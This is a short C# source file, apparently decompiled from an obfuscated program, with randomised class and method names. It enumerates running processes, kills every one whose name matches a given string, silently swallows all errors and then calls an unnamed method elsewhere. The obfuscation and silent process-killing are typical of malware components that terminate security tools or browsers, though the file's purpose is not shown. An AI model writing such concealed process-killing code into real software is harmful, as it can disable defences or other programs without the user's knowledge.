using System;
using System.Diagnostics;

namespace esImVhYKuzS;

public sealed class KoRxsmNhnLJiHl
{
	public static bool FuyNlVqxZsd(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void lRVQDOorMA(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (FuyNlVqxZsd(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					jIDJtYejSBzFCRw.IlSgvIcQsmbTvU();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
